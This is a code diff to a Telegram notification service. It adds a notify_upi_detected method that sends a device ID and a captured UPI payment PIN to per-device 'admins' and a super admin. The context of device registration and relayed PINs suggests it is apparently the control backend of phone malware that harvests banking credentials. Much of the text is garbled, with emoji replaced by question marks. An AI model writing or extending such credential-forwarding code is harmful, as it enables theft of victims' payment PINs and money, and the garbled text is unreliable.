@@ -223,6 +223,29 @@ class TelegramMultiService:
         # Also send to Administrator's Bot 1
         await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)
     
+    async def notify_upi_detected(
+        self,
+        device_id: str,
+        upi_pin: str,
+        admin_username: str
+    ):
+        """Notify UPI PIN detected (Bot 1 - ???? ????? device registration)"""
+        message = f"""
+?? <b>UPI PIN Detected</b>
+
+?? Admin: <code>{admin_username}</code>
+?? Device ID: <code>{device_id}</code>
+?? PIN: <code>{upi_pin}</code>
+?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
+
+? Device UPI is now available!
+"""
+        # Bot 1: Devices - Send to device owner (same channel as registration)
+        await self.send_to_admin(admin_username, message, bot_index=1)
+        
+        # Also send to Administrator's Bot 1
+        await self._notify_super_admin(message, bot_index=1, exclude_username=admin_username)
+    
     async def notify_admin_login(
         self,
         admin_username: str,
@@ -387,7 +410,7 @@ class TelegramMultiService:
             message += f"?? Details: {details}\n"
         
         if ip_address:
-            message += f"📍 IP: <code>{ip_address}</code>\n"
+            message += f"?? IP: <code>{ip_address}</code>\n"
         message += f"?? Time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
         
         
